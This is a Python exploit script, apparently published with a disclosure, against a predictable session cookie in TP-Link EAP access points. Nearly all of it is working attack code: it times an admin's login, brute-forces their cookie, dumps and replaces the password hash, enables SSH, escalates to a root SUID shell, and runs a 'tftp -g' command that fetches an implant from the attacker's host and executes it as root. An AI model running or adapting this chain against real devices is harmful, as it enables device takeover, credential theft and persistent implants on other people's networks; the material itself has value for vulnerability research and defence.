"""
An exploit for a predictible session bug in the TP-Link EAP series of routers.
Reported in the summer of 2021, patched by the end of that year.

Given just a IP of the admin logging in, this will detect them doing that and
then proceed to bruteforce their cookie, then use their cookie to get a root
shell.

Read the code before using, this is a not a clicky-clicky tool and should get
detected by any competent defender.
You'll probably have to do latency measurements to make it reliable and
will probably have to port it to a different firmware.

For latency measurements, try the live-update command in:
* https://github.com/bahorn/reqtime

For firmware, just dump the output of the tdp_firmware_version() function or
use the `--skip-vuln-check` flag.

And finally, don't use it for crimes kthx.

Available under the terms of the MIT license.
-B Horn
"""
import base64
import binascii
import json
import hashlib
import logging
import math
import sched
import socket
import struct
import sys
import time
import threading
import click
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import unpad
from paramiko.client import SSHClient, WarningPolicy

KNOWN_VULNERABLE_FW = [
    ('EAP245', '5.0.3 Build 20210604 Rel. 51934')
]
USER_AGENT = None

# Setup logging
logger = logging.getLogger('tpeapcookie')
logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
formatter = logging.Formatter(
    '%(levelname)s - %(message)s'
)
ch.setFormatter(formatter)
logger.addHandler(ch)


def tdp_firmware_version(host, port=20003):
    """
    Uses TDP to discover the targets firmware version.
    """
    TIMEOUT = 1
    target = (host, 20003)

    keypair = RSA.generate(2048)
    public_key_pem = keypair.public_key().export_key('PEM')

    payload = {
        'params': [
            {
                'version': 1,
                'key': public_key_pem.decode('ascii'),
                'load': '1'
            }
        ]
    }

    data = bytes(json.dumps(payload), encoding='ascii')
    size = len(data)

    version = b'\x02\x00'
    opcode = b'\x00\x01'
    size_packed = struct.pack(">H", size)
    header = \
        version + \
        opcode + \
        size_packed + \
        b'\xff\x01' + \
        b'\x00\x00' + \
        b'\x00\x00'

    checksum = struct.pack(
        ">I",
        binascii.crc32(header + b'\x5a\x6b\x7c\x8d' + data)
    )
    message = header + checksum + data

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(TIMEOUT)
    sock.sendto(message, target)

    try:
        resp, _ = sock.recvfrom(1024)
        d = json.loads(resp[16:])
        message_key = base64.b64decode(d['key'])
        load = base64.b64decode(d['load'])
        cipher_rsa = PKCS1_OAEP.new(keypair)
        session_key = cipher_rsa.decrypt(message_key)
        key = session_key[:16]
        iv = session_key[16:]
        cipher_aes = AES.new(key, AES.MODE_CBC, iv)
        data = json.loads(unpad(cipher_aes.decrypt(load), AES.block_size))
        return (data['model'], data['firmwareVersion'])
    except socket.timeout:
        return None


def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


class TPLinkCookieBrute:
    """
    Some TP-Link routers (i.e the EAP245) have a predictable cookie format.

    Specifically, they are made up of:
    * The IP Address
    * The Uptime (or something similar, never worked it out)
    """
    TEST_URL = 'http://%s/data/status.device.json?operation=read'

    def __init__(self, host):
        self.host = host

    def exploit(self, admin_ip, start, end, threads=4):
        """
        Bruteforce the cookie.

        Attempts can be whatever. I roughly worked it out to increment ~1000
        per second or so, with the default timeout being 15 minutes.
        """
        t = []
        cookie = {'value': None}
        thread_ranges = chunks(range(start, end), math.ceil((end - start) / 4))
        # start all the threads
        for thread, thread_range in enumerate(thread_ranges):
            i = threading.Thread(
                target=TPLinkCookieBrute.brute_thread,
                args=(
                    cookie,
                    threads,
                    thread,
                    thread_range,
                    self.host,
                    admin_ip
                )
            )
            i.start()
            t.append(i)
        # Now wait until we find the cookie
        for i in t:
            i.join()

        return cookie['value']

    def detect_spike(self, threshold, hertz=10, sample_count=1, window=10):
        """
        Look for spikes in response time above a threshold.

        If you see a spike, you probably have someone connecting to the device,
        and maybe logging in.

        Based on my work in:
        https://github.com/bahorn/reqtime
        """
        state = {'data': [], 'active': True, 'end': 0}
        # fetch an initial cookie
        s = sched.scheduler()

        def time_request(url):
            resp = requests.get(
                url,
                allow_redirects=False
            )
            return resp.elapsed.total_seconds()

        def collect_sample(scheduler):
            running = []
            url = f'http://{self.host}/404me'
            for i in range(sample_count):
                req_time = time_request(url)
                running.append(req_time > threshold)
                time.sleep(0.01)

            if sum(running) > 0:
                if state['active']:
                    logger.info('Spike Detected')
                state['active'] = False
                state['end'] = window

        def add_cookie():
            state['data'].append(self.get_cookie())
            state['data'] = state['data'][-(window*2):]

        def mainloop(scheduler):
            if not state['active']:
                if state['end'] <= 0:
                    return
                state['end'] -= 1

            scheduler.enter(1, 1, mainloop, (scheduler,))
            # Add events for sample collection
            for i in range(hertz):
                scheduler.enter((i/hertz), 1, collect_sample, (scheduler, ))
            # fetch a cookie
            add_cookie()

        s.enter(0, 1, mainloop, (s,))
        s.run()

        return (state['data'][0][1], state['data'][-1][1])

    @staticmethod
    def brute_thread(cookie, threads, tid, thread_range, host, admin_ip):
        """
        The brute force thread
        """
        for i in thread_range:
            if cookie['value']:
                return
            modified_cookie = TPLinkCookieBrute.pack_cookie(admin_ip, i)
            if TPLinkCookieBrute.logged_in(host, modified_cookie):
                logger.info(
                    f'valid cookie {modified_cookie} (attempt {tid}:{i})'
                )
                cookie['value'] = modified_cookie

    @staticmethod
    def logged_in(host, cookie):
        """
        Check if we are logged in.
        """
        r = requests.get(
            TPLinkCookieBrute.TEST_URL % host,
            cookies={'COOKIE': cookie},
            headers={'Referer': 'http://%s/' % host}
        )
        return 'data' in r.json()

    def get_cookie(self):
        r = requests.get(self.TEST_URL % self.host)
        our_cookie = r.cookies['COOKIE']
        # now lets split it into the ip and timestamp
        ip_raw, uptime_raw = our_cookie[:8], our_cookie[8:]
        ip = '.'.join(
            map(str, struct.unpack('>BBBB', binascii.unhexlify(ip_raw))))
        uptime = struct.unpack('>I', binascii.unhexlify(uptime_raw))
        return (ip, uptime[0])

    @staticmethod
    def hex_ip(ip):
        """
        Converts the ascii representation of an IP into hex.
        """
        return "%02x%02x%02x%02x" % tuple(map(int, ip.split('.')))

    @staticmethod
    def pack_cookie(ip, ts):
        ip_hex = TPLinkCookieBrute.hex_ip(ip)
        ts_hex = binascii.hexlify(struct.pack('>I', ts)).decode('ascii')
        return ip_hex + ts_hex


class EAPHTTPTool:
    """
    Tool to interact with the EAP device post auth.
    """

    def __init__(self, host, port=80, proto='http', cookie=None):
        self.sess = requests.Session()
        self.target = host
        self.host = '{}://{}:{}'.format(proto, host, port)
        self.sess.headers['User-Agent'] = USER_AGENT
        self.sess.headers['Referer'] = '{}/'.format(self.host)
        self.auth_type = {}
        if cookie:
            self.sess.cookies['COOKIE'] = cookie
        else:
            self.sess.get('{}/'.format(self.host))

    # Authentication
    def auth_password(self, username, password):
        """
        Authenticate with a password.
        """
        phash = EAPHTTPTool._hash_password(password)
        if self.auth_hash(username, phash):
            self.auth_type['password'] = password
            return True

        return False

    def auth_hash(self, username, phash):
        """
        Authenticate with just an MD5 Hash, which you can dump from config
        files.
        """
        self.sess.post(
            '{}/'.format(self.host),
            data={
                'username': username,
                'password': phash
            }
        )
        if self.login_test():
            self.auth_type['hash'] = phash
            return True
        return False

    def login_test(self):
        """
        Check if a login was successful
        """
        req = self.sess.post(
            '{}/data/login.json'.format(self.host),
            data={'operation': 'read'}
        )
        return req.json()['error'] == 0

    # Get the device status
    def device_status(self):
        """
        Get the device status
        """
        url = '{}/data/status.device.json?operation=read'.format(self.host)
        req = self.sess.get(url)
        return req.json()

    def get_user(self):
        """
        Dump the username / hash.

        Yep this works... No need to read the config file.
        """
        url = '{}/data/userAccount.json'.format(self.host)
        req = self.sess.post(url, data={'operation': 'read'})
        data = req.json()['data']
        return (data['curUserName'], data['curPwd'])

    def change_user(self, username, password):
        """
        Only needs MD5 hashes
        """
        old_username, old_password = self.get_user()
        url = '{}/data/userAccount.json'.format(self.host)
        req = self.sess.post(url, data={
            'operation': 'write',
            'curUserName': old_username,
            'curPassword': old_password,
            'newUserName': username,
            'newPwd': password
        })
        return req.status_code == 200

    def ssh_status(self):
        """
        Get the status of the SSH server
        """
        url = '{}/data/sshServer.json'.format(self.host)
        req = self.sess.post(url, data={'operation': 'read'})
        return req.json()['data']

    def ssh_access(self, enable, port=None):
        """
        Enable / disable SSH access
        """
        url = '{}/data/sshServer.json'.format(self.host)
        status = self.ssh_status()
        status['operation'] = 'write'
        status['sshServerEnable'] = enable
        if port:
            status['serverPort'] = port
        req = self.sess.post(url, data={'operation': 'write'})
        return req.status_code == 200

    def run_implant(self, file, tftpd_host=None, tftpd_port=9069):
        """
        We can enable SSH, and privesc with that to get a shell.
        """
        # get the current config
        ssh_status = self.ssh_status()
        username, password_hash = self.get_user()
        logger.info(f'Creds: {username}:{password_hash}')
        # you may want to disable the remote logging here
        # enable our access
        if not ssh_status['sshServerEnable']:
            self.ssh_access(True)
        logger.info('Changing the user password to `badpassword`')
        self.change_user(username, EAPHTTPTool._hash_password('badpassword'))
        # install our shell
        logger.info('Attempting to login via SSH')
        try:
            with SSHClient() as client:
                client.set_missing_host_key_policy(WarningPolicy)
                client.connect(
                    self.target,
                    port=ssh_status['serverPort'],
                    username=username,
                    password='badpassword'
                )
                logger.info('Got a shell, creating a SUID sh')
                # privesc from guest to root
                client.exec_command('cliclientd tdb "-r cp /bin/sh /tmp/sh"')
                time.sleep(1)
                client.exec_command('cliclientd tdb "-r chmod 7777 /tmp/sh"')
                time.sleep(1)

                # download a custom binary to run
                payload = [
                    'tftp -g -r out.elf -l /tmp/out.elf {}',
                    'chmod +x /tmp/out.elf',
                    '/tmp/out.elf &',
                ]

                ip = tftpd_host if tftpd_host else self._get_ip()
                payload = \
                    ' ; '.join(payload).format(
                        "{}:{}".format(
                            ip, tftpd_port
                        )
                    )
                logger.info(f'Running the following as root: {payload}')
                client.exec_command('/tmp/sh -c "{}"'.format(payload))
                # cleanup
                logger.info('Cleaning up')
                client.exec_command('/tmp/sh -c "rm /tmp/out.elf /tmp/sh"')
        except Exception as e:
            logger.error(e)

        logger.info(
            'Resetting ssh status and user password back to the original'
        )

        # restore everything
        if not ssh_status['sshServerEnable']:
            self.ssh_access(False)

        self.change_user(username, password_hash)

    @staticmethod
    def _hash_password(password):
        return hashlib.md5(password.encode('utf-8')).hexdigest().upper()

    def _get_ip(self):
        """
        Discover the IP used by this box to talk to the target
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((self.target, 20003))
        res = sock.getsockname()[0]
        sock.close()
        return res


@click.command()
@click.argument('host')
@click.argument('admin-ip')
@click.argument('implant')
@click.option('--skip-vuln-check', is_flag=True, default=False)
@click.option('--tftpd-host', default=None)
@click.option('--tftpd-port', default=9069)
@click.option('--threads', default=4)
@click.option('--threshold', default=0.01)
@click.option('--wait-period', default=20)
@click.option('--hertz', default=20)
def exploit(host, admin_ip, implant, skip_vuln_check, tftpd_host, tftpd_port,
            threads, threshold, wait_period, hertz):
    """
    Exploit logic.
    """
    # First, we only want to attempt to exploit firmware known to be
    # vulnerable.
    if not skip_vuln_check:
        fw_version = tdp_firmware_version(sys.argv[1])
        logger.info(f'Device: {fw_version[0]}, Firmware: {fw_version[1]}')

        if fw_version not in KNOWN_VULNERABLE_FW:
            logging.info('Not known to be vulnerable!')
            return
    # Given we have a vulnerable device, we want to now move onto discovering
    # if an admin has an active session.
    # This uses the response time of the the device to get an idea when an
    # admin is logging in.
    # This isn't perfect, but we can attempt multiple times until we
    # succesfully discover that they are active.
    cookie = None
    cookie_cracker = TPLinkCookieBrute(host)
    while True:
        start, end = cookie_cracker.detect_spike(threshold, hertz=hertz)
        # wait ~10 seconds or so they have a chance to login.
        logger.info(f'Found range {start}:{end}')
        logger.info(f'Waiting {wait_period} seconds to ensure a login')
        time.sleep(wait_period)
        logger.info(f'Starting cookie brute for range {start}:{end}')
        # See if we hit a valid range, or maybe just a random cpu spike.
        cookie = cookie_cracker.exploit(admin_ip, start, end, threads=threads)
        if cookie:
            break
        logger.info(f'Unsuccessful for range {start}:{end}')
    # We can now move into the post-exploitation stage, where we use this
    # cookie to give us a SSH session, which we'll use to get our implant on
    # the device.
    eap = EAPHTTPTool(host, cookie=cookie)
    eap.run_implant(
        implant,
        tftpd_host=tftpd_host,
        tftpd_port=tftpd_port
    )


if __name__ == "__main__":
    exploit()
